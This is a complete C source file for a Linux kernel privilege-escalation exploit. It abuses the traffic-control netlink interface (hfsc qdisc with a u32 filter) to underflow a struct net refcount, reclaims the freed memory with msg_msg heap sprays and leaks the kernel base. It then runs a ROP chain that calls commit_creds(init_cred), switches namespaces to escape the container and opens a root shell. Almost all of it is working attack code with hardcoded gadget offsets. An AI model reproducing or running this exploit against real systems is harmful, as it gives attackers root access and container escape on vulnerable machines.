#define _GNU_SOURCE

#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <assert.h>
#include <stdarg.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <linux/nsfs.h>
// #include "libexp.h"

#define SPRAY_NUM1 10
#define SPRAY_NUM2 10
#define SPRAY_NUM3 0x30
#define u64 unsigned long long
#define u32 unsigned int
#define unlikely(x)	__builtin_expect(!!(x), 0)

u64 kernel_base = 0;
u64 slide = 0;
u64 kfree_ptr = 0xffffffff822a8858; // ext4_feat_ktype
int *success, *crash;
char *self_path;
pid_t pids1[SPRAY_NUM1];
pid_t pids2[SPRAY_NUM2];
pid_t pids3[SPRAY_NUM3];
unsigned long long user_ss, user_sp, user_rflags, user_rip, user_cs;

struct msg_spray_t {
	struct msg_spray_t *next;
	int msgqid;
	void *payload;
	size_t len;
	u32 num;
};

void shell(void)
{
	printf("uid: %d\n", getuid());
	system("/bin/bash");
}

pid_t clean_fork(void)
{
	pid_t pid = fork();
	if(pid) return pid;

	assert(prctl(PR_SET_PDEATHSIG, SIGKILL) >= 0);
	return pid;
}

void set_cpu(int cpuid)
{
	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(cpuid, &my_set);
	assert(sched_setaffinity(0, sizeof(my_set), &my_set) == 0);
}

int write_file(const char* fname, const char* fmt, ...) 
{
	char buf[1024];
	va_list args;

	va_start(args, fmt);
	vsnprintf(buf, sizeof(buf)-1, fmt, args);
	va_end(args);
	buf[sizeof(buf)-1] = 0; 

	int len = strlen(buf);
	int fd = open(fname, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return -1;
	if (write(fd, buf, len) != len) {
		close(fd);
		return -1;
	}	
	close(fd);
	return 0;
}

void setup_sandbox(void)
{
	int real_uid = getuid();
	int real_gid = getgid();

	assert(unshare(CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWNS | CLONE_NEWPID) == 0);
	assert(write_file("/proc/self/setgroups", "deny") >= 0);
	assert(write_file("/proc/self/uid_map", "0 %d 1\n", real_uid) >= 0);
	assert(write_file("/proc/self/gid_map", "0 %d 1\n", real_gid) >= 0);
}

void *build_pkt(struct nlmsghdr *hdr, struct tcmsg *tcmsg, void *attrs, int attr_len)
{
	// netlink packet, from /usr/include/linux/netlink.h
	/*
	 *  <------- NLA_HDRLEN ------> <-- NLA_ALIGN(payload)-->
	 * +---------------------+- - -+- - - - - - - - - -+- - -+
	 * |		Header	   | Pad |	 Payload	   | Pad |
	 * |   (struct nlattr)   | ing |				   | ing |
	 * +---------------------+- - -+- - - - - - - - - -+- - -+
	 *  <-------------- nlattr->nla_len -------------->
	 */

	// struct nlattr {
	// 	__u16		   nla_len;
	// 	__u16		   nla_type;
	// };

	// traffic control policy
	// const struct nla_policy rtm_tca_policy[TCA_MAX + 1] = {
	// 	[TCA_KIND]		= { .type = NLA_STRING },
	// 	[TCA_RATE]		= { .type = NLA_BINARY,
	// 					.len = sizeof(struct tc_estimator) },
	// 	[TCA_STAB]		= { .type = NLA_NESTED },
	// 	[TCA_DUMP_INVISIBLE]	= { .type = NLA_FLAG },
	// 	[TCA_CHAIN]		= { .type = NLA_U32 },
	// 	[TCA_INGRESS_BLOCK]	= { .type = NLA_U32 },
	// 	[TCA_EGRESS_BLOCK]	= { .type = NLA_U32 },
	// };
	//
	// struct tcmsg {
	// 	unsigned char	tcm_family;
	// 	unsigned char	tcm__pad1;
	// 	unsigned short	tcm__pad2;
	// 	int				tcm_ifindex;
	// 	__u32			tcm_handle;
	// 	__u32			tcm_parent;
	// 	__u32			tcm_info;
	// };
	//
	// struct nlmsghdr {
	//	 __u32 nlmsg_len;// = 0x38;
	//	 __u16 nlmsg_type;// = 0x24??? RTM_NEWQDISC, creating a new qdisc scheduler
	//	 __u16 nlmsg_flags;// = 0x401 NLM_F_REQUEST(0x1)|NLM_F_CREATE(0x400)
	//	 __u32 nlmsg_seq;// = NL_AUTO_SEQ
	//	 __u32 nlmsg_pid;// = NL_AUTO_PID
	// };
	//
	//
	//enum {
	//	TCA_U32_UNSPEC,
	//	TCA_U32_CLASSID,
	//	TCA_U32_HASH,
	//	TCA_U32_LINK,
	//	TCA_U32_DIVISOR,
	//	TCA_U32_SEL,
	//	TCA_U32_POLICE,
	//	TCA_U32_ACT,
	//	TCA_U32_INDEV,
	//	TCA_U32_PCNT,
	//	TCA_U32_MARK,
	//	TCA_U32_FLAGS,
	//	TCA_U32_PAD,
	//	__TCA_U32_MAX
	//};
	// struct nla_policy u32_policy[TCA_U32_MAX + 1] = {
	//	[TCA_U32_CLASSID]	= { .type = NLA_U32 },
	//	[TCA_U32_HASH]		= { .type = NLA_U32 },
	//	[TCA_U32_LINK]		= { .type = NLA_U32 },
	//	[TCA_U32_DIVISOR]	= { .type = NLA_U32 },
	//	[TCA_U32_SEL]		= { .len = sizeof(struct tc_u32_sel) },
	//	[TCA_U32_INDEV]		= { .type = NLA_STRING, .len = IFNAMSIZ },
	//	[TCA_U32_MARK]		= { .len = sizeof(struct tc_u32_mark) },
	//	[TCA_U32_FLAGS]		= { .type = NLA_U32 },
	//};

	void *payload = calloc(1, 0x1000);
	void *ptr = payload;
	hdr->nlmsg_len = sizeof(struct nlmsghdr) + sizeof(struct tcmsg) + attr_len;
	// printf("nlmsg_len: %#x\n", hdr->nlmsg_len);
	// printf("attr_len: %#x\n", attr_len);

	memcpy(ptr, hdr, sizeof(struct nlmsghdr));
	ptr += sizeof(struct nlmsghdr);
	memcpy(ptr, tcmsg, sizeof(struct tcmsg));
	ptr += sizeof(struct tcmsg);
	memcpy(ptr, attrs, attr_len);
	return payload;
}

void net_spray1()
{
	for(int i=0; i<SPRAY_NUM1; i++) {
		pid_t pid = clean_fork();
		assert(pid != -1);
		if(!pid) {
			if (unshare(CLONE_NEWNET | CLONE_NEWNS | CLONE_NEWUSER) != 0) {
				perror("unshare");
			}
			sleep(100000);
		}
		pids1[i] = pid;
	}
	usleep(500000);
}

void net_spray2()
{
	for(int i=0; i<SPRAY_NUM2; i++) {
		pid_t pid = clean_fork();
		assert(pid != -1);
		if(!pid) {
			if (unshare(CLONE_NEWNET | CLONE_NEWNS | CLONE_NEWUSER) != 0) {
				perror("unshare");
			}
			sleep(100000);
		}
		pids2[i] = pid;
	}
	usleep(500000);
}

void net_spray3()
{
	for(int i=0; i<SPRAY_NUM3; i++) {
		pid_t pid = clean_fork();
		assert(pid != -1);
		if(!pid) {
			if (unshare(CLONE_NEWNET | CLONE_NEWNS | CLONE_NEWUSER) != 0) {
				perror("unshare");
			}
			sleep(100000);
		}
		pids3[i] = pid;
	}
	usleep(500000);
}
void net_defragment(int num)
{
	for(int i=0; i<num; i++) {
		if(!clean_fork()) {
			if (unshare(CLONE_NEWNS | CLONE_NEWNET | CLONE_NEWUSER) != 0) {
				perror("unshare");
			}
			sleep(100000);
		}
	}
	usleep(500000);
	// sleep(1);
}

void net_release1()
{
	for(int i=0; i<SPRAY_NUM1; i++) {
		int ret = kill(pids1[i], SIGKILL);
		assert(ret == 0);
	}
}

void net_release2()
{
	for(int i=0; i<SPRAY_NUM2; i++) {
		int ret = kill(pids2[i], SIGKILL);
		assert(ret == 0);
	}
}

void net_release3(int full)
{
	int jump;
	if(full) jump = 1;
	else jump = 2;
	// we don't free all struct net so we don't discard slab
	for(int i=0; i<SPRAY_NUM3; i+=jump) {
		int ret = kill(pids3[i], SIGKILL);
		if(!full) assert(ret == 0);
	}
}

struct msg_spray_t *msg_spray_once(void *payload, size_t msg_size, u32 num)
{
	int msgqid;
	char *buf;

	// create the message queue id first
	msgqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	assert(msgqid >= 0);

	// do spray
	int ret;
	for(int i=0; i<num; i++) {
		ret = msgsnd(msgqid, payload, msg_size, IPC_NOWAIT);
		assert(ret >= 0);
	}

	// return info about this spray
	struct msg_spray_t *spray = malloc(sizeof(struct msg_spray_t));
	spray->next = NULL;
	spray->msgqid = msgqid;
	spray->payload = payload;
	spray->len = msg_size;
	spray->num = num;
	return spray;
}

struct msg_spray_t *msg_spray(void *payload, size_t msg_size, u32 num)
{
	u32 sent = 0;
	struct msg_spray_t *spray = NULL, *tmp_spray;

	// send messege one at a time
	while(num > 0) {
		u32 todo = 1;
		tmp_spray = msg_spray_once(payload, msg_size, todo);
		sent += todo;
		num -= todo;

		// link tmp_spray
		if(!spray) spray = tmp_spray;
		else {
			tmp_spray->next = spray->next;
			spray->next = tmp_spray;
		}
	}
	return spray;
}

int get_inum()
{
	int i;
	char buf[0x200];
	memset(buf, 0, sizeof(buf));

	// reference: function ns_get_name
	ssize_t ret = readlink("/proc/self/ns/net", buf, sizeof(buf));
	assert(ret >= 0);
	for(i=0; i<ret; i++) {
		if(buf[i] == '[') break;
	}
	assert(buf[i] == '[');

	return atoi(&buf[i+1]);
}

int identify_msg(struct msg_spray_t *spray)
{
	int ret;
	int inum;
	void *payload = malloc(spray->len+0x10);
	void *buffer = malloc(spray->len+0x10);
	struct msg_spray_t *new_spray;
	int *ptr = (int *)(payload+8);

	// taint payload
	memset(payload, 'A', 8);
	for(int i=0; i<(spray->len-8)/sizeof(*ptr); i++) {
		ptr[i] = i+8; // so ptr[i] != 4
	}

	while(spray) {
		// free the message
		ret = msgrcv(spray->msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT);
		// printf("ret: %d\n", ret);
		assert(ret >= 0);

		// occupy the slot
		new_spray = msg_spray_once(payload, spray->len, 1);
		inum = get_inum();
		// printf("inum: %#x\n", inum);
		if(inum != 4) break;

		spray = spray->next;
	}
	assert(spray != NULL);
	return new_spray->msgqid;
}

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void *prepare_payload(char *payload)
{
	// pivot stack without clobbering rbp
	*(long *)&payload[0x20] = slide + 0xffffffff81c0917c; // : push rdi ; jo 0xffffffff81c09139 ; jmp qword ptr [rax + 0x51]
	*(long *)&payload[0x51] = slide + 0xffffffff81c0548e; // : pop rsp ; call qword ptr [rax - 0x72]
	*(long *)&payload[-0x72] = slide + 0xffffffff810566a9; // : pop rdi ; pop rsi ; pop rdx ; pop rcx ; ret

}

void prepare_ropchain(u64 *rop, u64 buffer)
{
	int idx = 0;

	// save rbp+0x140 to buffer
    rop[idx++] = slide + 0xffffffff816fa405; // enter 0,0; pop rbx; pop r14; pop rbp; ret
    rop[idx++] = 0xdeadbeef;
    rop[idx++] = 0xdeadbeef;
	rop[idx++] = slide + 0xffffffff8102c2c1;// : pop rax ; ret
	rop[idx++] = 0x140;
	rop[idx++] = slide + 0xffffffff81205e83; // : add rbx, rax ; mov rax, rbx ; pop rbx ; pop r14 ; pop rbp ; ret
    rop[idx++] = 0xdeadbeef;
    rop[idx++] = buffer-0x108;
    rop[idx++] = 0xdeadbeef;
	rop[idx++] = slide + 0xffffffff81166890; // : mov qword ptr [r14 + 0x108], rax ; xor eax, eax ; pop rbx ; pop r14 ; pop rbp ; ret
    rop[idx++] = 0xdeadbeef;
    rop[idx++] = 0xdeadbeef;
    rop[idx++] = 0xdeadbeef;

	// escalate privilege
    rop[idx++] = slide + 0xffffffff81067a60; // : pop rdi ; ret
    rop[idx++] = slide + 0xffffffff82250950; // init_cred
    rop[idx++] = slide + 0xffffffff8109ed70; // commit_creds

	// switch namespace for itself (to get rid of the broken net namespace)
    rop[idx++] = slide + 0xffffffff81067a60; // : pop rdi ; ret
    rop[idx++] = getpid();
    rop[idx++] = slide + 0xffffffff810963e0; // find_task_by_vpid
    rop[idx++] = slide + 0xffffffff8108d212; // : pop rdx ; ret
    rop[idx++] = 1;
    rop[idx++] = slide + 0xffffffff8154e861; // cmp rdx, 1 ; jne 0xffffffff8154e89d ; pop rbp ; ret;
    rop[idx++] = 0; // padding
    rop[idx++] = slide + 0xffffffff8123cb26; // mov rdi, rax ; jne 0xffffffff8123cb16 ; pop rbp ; ret;
    rop[idx++] = 0; // padding
    rop[idx++] = slide + 0xffffffff8105d30f; // : pop rsi ; ret;
    rop[idx++] = slide + 0xffffffff82250580; // init_nsproxy
    rop[idx++] = slide + 0xffffffff8109d1a0; // switch_task_namespaces

	// switch namespace for pid 1
    rop[idx++] = slide + 0xffffffff81067a60; // : pop rdi ; ret
    rop[idx++] = 1;
    rop[idx++] = slide + 0xffffffff810963e0; // find_task_by_vpid
    rop[idx++] = slide + 0xffffffff8108d212; // : pop rdx ; ret
    rop[idx++] = 1;
    rop[idx++] = slide + 0xffffffff8154e861; // cmp rdx, 1 ; jne 0xffffffff8154e89d ; pop rbp ; ret;
    rop[idx++] = 0; // padding
    rop[idx++] = slide + 0xffffffff8123cb26; // mov rdi, rax ; jne 0xffffffff8123cb16 ; pop rbp ; ret;
    rop[idx++] = 0; // padding
    rop[idx++] = slide + 0xffffffff8105d30f; // : pop rsi ; ret;
    rop[idx++] = slide + 0xffffffff82250580; // init_nsproxy
    rop[idx++] = slide + 0xffffffff8109d1a0; // switch_task_namespaces

	// return execution
    rop[idx++] = slide + 0xffffffff81000571; // : pop rbp ; ret
    rop[idx++] = buffer + 0x10;
    rop[idx++] = slide + 0xffffffff8123e2cd; // : push qword ptr [rbp - 0x10] ; pop rbp ; ret
    rop[idx++] = slide + 0xffffffff810679cc; // : mov rsp, rbp ; pop rbp ; ret
}

void exploit(void)
{
	puts("Stage 2: trigger vulnerability");
	printf("self path: %s\n", self_path);
	int ns_fd = open("/proc/self/ns/net", 0);
	int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	int self_fd = open(self_path, 0);
	assert(self_fd >= 0);

	// include uapi/linux/rtnetlink.h	
	// send the first nlmsg pkt to create qdisc
	// triggers rtnetlink_rcv_msg->tc_modify_qdisc // queue discipline
	//
	//
	// from net/sched/sch_api.c
   	// qdisc's are divided to two categories:
   	// - "queues", which have no internal structure visible from outside.
   	// - "schedulers", which split all the packets to "traffic classes",
   	//   using "packet classifiers" (look at cls_api.c)
   	// In turn, classes may have child qdiscs (as rule, queues)
   	// attached to them etc. etc. etc.
	// 
	// SO hfsc is a qdisc and u32 is a classifier
	//
	//
	//
	// send first packet to create a new qdisc
	struct nlmsghdr nlmsghdr = {	.nlmsg_len = 0,
									.nlmsg_type = RTM_NEWQDISC, // 0x24
									.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE,
									.nlmsg_seq = 0, // NL_AUTO_SEQ
									.nlmsg_pid = 0}; // NL_AUTO_PID
	struct tcmsg tcmsg = {	.tcm_family = PF_UNSPEC, // 0
							.tcm_ifindex = 1, // lo
							.tcm_handle = 0,
							.tcm_parent = TC_H_ROOT, // 0xffffffff
							.tcm_info = 0};
	char attrs1[] =	"\x0c\x00""\x01\x00""hfsc\x00\x00\x00\x00"
					"\x08\x00""\x02\x00""\x00\x00\x00\x00";
	int attr_len1 = sizeof(attrs1) - 1; // minus the trailing null byte
	void *pkt = build_pkt(&nlmsghdr, &tcmsg, attrs1, attr_len1);

	send(sk, pkt, nlmsghdr.nlmsg_len, MSG_DONTWAIT);

	// send the second nlmsg pkt to successfully trigger tc_new_tfilter
	struct nlmsghdr nlmsghdr2 = {	.nlmsg_len = 0,
									.nlmsg_type = RTM_NEWTFILTER, // 0x2c
									.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE,
									.nlmsg_seq = 0, // NL_AUTO_SEQ
									.nlmsg_pid = 0}; // NL_AUTO_PID
	struct tcmsg tcmsg2 = {	.tcm_family = PF_UNSPEC, // 0
							.tcm_ifindex = 1, // lo
							.tcm_handle = 0,
							.tcm_parent = 0,
							.tcm_info = 1};
	char attrs2[] =	"\x08\x00""\x01\x00""u32\x00" // u32
					"\x18\x00""\x02\x00" // NESTED
						"\x14\x00""\x05\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";// TCA_U32_SEL
	int attr_len2 = sizeof(attrs2) - 1; // minus the trailing null byte
	void *pkt2 = build_pkt(&nlmsghdr2, &tcmsg2, attrs2, attr_len2);

	send(sk, pkt2, nlmsghdr2.nlmsg_len, MSG_DONTWAIT);

	// send the third nlmsg pkt to fail tc_new_tfilter
	//
	// u32 handler: xxx yy zzz
	// xxx: HTID, yy: HASH, zzz: NODE
	// yyzzz: KEY
	struct nlmsghdr nlmsghdr3 = {	.nlmsg_len = 0,
									.nlmsg_type = RTM_NEWTFILTER,
									.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE,
									.nlmsg_seq = 0, // NL_AUTO_SEQ
									.nlmsg_pid = 0}; // NL_AUTO_PID
	struct tcmsg tcmsg3 = {	.tcm_family = PF_UNSPEC, // 0
							.tcm_ifindex = 1, // lo
							.tcm_handle = 0x80000800, // HTID: 0x800, HASH: 0, NODE: 0x800, KEY:0x00800
							.tcm_parent = 0,
							.tcm_info = 1};
	char attrs3[] =	"\x08\x00""\x01\x00""u32\x00" // u32
					"\x0c\x00""\x02\x00" // NESTED
						"\x08\x00""\x06\x00""\x00\x00\x00\x00";// TCA_U32_POLICE
	int attr_len3 = sizeof(attrs3) - 1; // minus the trailing null byte
	void *pkt3 = build_pkt(&nlmsghdr3, &tcmsg3, attrs3, attr_len3);

	// decrease struct net refcount to 1
	send(sk, pkt3, nlmsghdr3.nlmsg_len, MSG_DONTWAIT);
	send(sk, pkt3, nlmsghdr3.nlmsg_len, MSG_DONTWAIT);

	// clear other objects in the same cache as our victim object
	// the target slab will be added to cpu_partial
	puts("Stage 3: reclaim object");
	net_release1();
	net_release2();
	sleep(2);

	// force the kernel to drain cpu_partial
	net_release3(0);

	// wait for everything to happen
	sleep(3);
	// puts("hey!");
	// getchar();

	// now decrease struct net refcount to 0 and wait for the object release and final discard_slab	
	send(sk, pkt3, nlmsghdr3.nlmsg_len, MSG_DONTWAIT);
	sleep(1);

	// try to reclaim the page!
	int msg_size = 0xff8-0x30;
	void *payload = malloc(msg_size+0x10);
	memset(payload, 0x41, 8); // make sure it is a valid message
	long *ptr = (long *)(payload+8);
	// taint messege, if struct net is aligned with msg_msg,
	// we will know according to the leaked value
	for(int i=0; i<(msg_size-8)/8; i++) {
		if(i == 19) ptr[i] = 0xfffffe0000000004;
		else ptr[i] = 0xfffffe0000000004;
	}
	struct msg_spray_t *spray = msg_spray(payload, msg_size, 0x600);
	int inum = get_inum();
	printf("inum: %#x\n", inum);
	assert(inum == 4);

	puts("Stage 4: leak info");
	// now we know we successfully reclaim the page, dereference it to get leak!
	long ret = ioctl(ns_fd, NS_GET_NSTYPE, 0);
	printf("leaked value: %#lx\n", ret);
	assert(ret != -1); // if struct net is aligned with msg_msg, the linked list will be corrupted because struct net thinks the heap pointer is a refcount and replaces it with REFCOUNT_SATURATE.
	kernel_base = ret - 0xa08e03;
	slide = kernel_base - 0xffffffff81000000ULL;
	kfree_ptr += slide;
	printf("kernel_base: %#llx\n", kernel_base);
	printf("kalsr_slide: %#llx\n", slide);
	assert((kernel_base & 0xfffff) == 0);

	// now we need to carefully identify the messege that overlaps with the struct net
	// and calculate the offset of struct net inside the messege
	int msgqid = identify_msg(spray);
	int offset = get_inum()*4;
	printf("offset: %#x\n", offset);
	assert(offset <= 0x800);

	// now we know the offset is within the first half of the messege, we can safely craft chunk overlapping and bypass hardened_usercopy
	// step 1: swap payload so that ns->ops->put == kfree
	// step 2: reclaim it with a short msgmsg
	// step 3: send one more msgmsg containing rop chain and leak the address of it from the msgmsg object in step 2
	// step 1 =>
	puts("Stage 5: prepare rop chain");
	puts("step 1");
	char buffer1[0x2000];
	char *kfree_payload = malloc(0x2000);
	memset(kfree_payload, 0x41, 0x2000);
	long *fake_ns = (long *)&kfree_payload[offset-0x30+8];
	fake_ns[0x8/8] = kfree_ptr - 0x20; // set net->ns->ops
	fake_ns[0x10/8] = 0x41414141; // set net->ns->inum == 0x41414141

	msgrcv(msgqid, buffer1, sizeof(buffer1), 0, MSG_NOERROR | IPC_NOWAIT);
	struct msg_spray_t *spray1 = msg_spray_once(kfree_payload, 0xff8-0x30, 1);
	assert(get_inum() == 0x41414141);
	// getchar();

	// step 2 =>
	puts("step 2");
	char buffer2[0x1000];
	memset(buffer2, 0x42, sizeof(buffer2));
	close(ns_fd);
	struct msg_spray_t *spray2 = msg_spray_once(kfree_payload, 0x810-0x30, 1);
	// getchar();

	// step 3 =>
	// save_state();
	puts("step 3");
	char buffer3[0x1000];
	memset(buffer3, 0x43, sizeof(buffer3));
	prepare_payload(&buffer3[8+0x80]);// pivot into fake_ns without clobbering rbp

	msgsnd(spray2->msgqid, buffer3, 0xff8-0x30, IPC_NOWAIT);
	msgsnd(spray2->msgqid, buffer3, 0xff8-0x30, IPC_NOWAIT);
	msgsnd(spray2->msgqid, buffer3, 0xff8-0x30, IPC_NOWAIT);
	// getchar();

	// now leak the address of the fake_ops! (inside the payload msgmsg)
	msgrcv(spray1->msgqid, buffer1, sizeof(buffer1), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
	ptr = (long *)buffer1;
	u64 fake_ops = ptr[offset/8-5] + 0x30 + 0x80;
	printf("fake_ops: %#llx\n", fake_ops);
	assert((fake_ops & 0xf) == 0);
	// getchar();

	// now finally!
	// swap the outer msgmsg so that ns->ops == fake_ops!
	char final_payload[0x1000];
	memset(final_payload, 'A', sizeof(final_payload));
	msgrcv(spray1->msgqid, buffer1, sizeof(buffer1), 0, MSG_NOERROR | IPC_NOWAIT);
	fake_ns = (long *)&final_payload[offset-0x30+8];
	fake_ns[0x0/8] = 0; // set net->ns->stashed == NULL
	fake_ns[0x8/8] = fake_ops; // set net->ns->ops
	fake_ns[0x10/8] = 0x42424242; // set net->ns->inum == 0x42424242
	prepare_ropchain(&fake_ns[0x18/8], fake_ops+0x200);
	struct msg_spray_t *spray_x = msg_spray(final_payload, 0xff8-0x30, 0x20);
	assert(get_inum() == 0x42424242);

	puts("Stage 5: trigger payload");
	// getchar();
	ns_fd = open("/proc/self/ns/net", 0);
	// close(sk);
	// puts("opened!");
	// getchar();
	// save_state();
	// *success = 1;
	close(ns_fd);

	printf("uid: %d\n", getuid());
	puts("Done!!!!");
	// assert(unshare(CLONE_NEWNET) == 0);
	ret = setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
	assert(ret == 0);
	// ret = setns(open("/proc/1/ns/net", O_RDONLY), 0);
	// assert(ret == 0);
	system("/bin/sh");
	// ret = execve("/bin/bash", NULL, NULL);
	// printf("execve ret: %d\n", ret);
	getchar();
}

void handle_sig(int sig)
{
	printf("Caught signal %d\n", sig);
	puts("sleep!");
	net_release3(1);
	*crash = 1;
	sleep(10000);
}

void attempt(void)
{
	signal(SIGABRT, handle_sig);
	// signal(SIGSEGV, shell);
	set_cpu(0);

	puts("Stage 1: prepare heap layout");
	// first, defragment net_namespace
	puts("1");
	net_defragment(0x40);

	// second, spray more struct net for later unfreezing
	puts("2");
	net_spray3();

	// third, surround the target struct net with controlled struct net
	puts("3");
	net_spray1();
	setup_sandbox();
	net_spray2();
	net_defragment(0x10);

	// puts("sandbox up!");
	// getchar();
	exploit();
	puts("Execution ended!");
	// net_spray3();
	// net_release3();

	// sleep(1000);
}

int main(int argc, char **argv)
{
	// printf("uid: %d, euid: %d\n", getuid(), geteuid());
	// if(geteuid() == 0) {
	// 	setuid(0);
	// 	setgid(0);
	// 	int ret;
	// 	sleep(100000);
	// }
	crash = (int *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON, -1, 0);
	success = crash + 1;
	*success = 0;
	self_path = success + 1;
	strcpy(self_path, argv[0]);
	while(*success == 0) {
		*crash = 0;
		if(!fork()) {
			puts("attempt!!");
			attempt();
		}
		while(*crash == 0 && *success == 0) {
			usleep(100000);
		}
		sleep(3);// give it some time to clean up memory
	}
	puts("Launch shell!");
	// system("/bin/bash");
	system(self_path);
	sleep(100000);
}

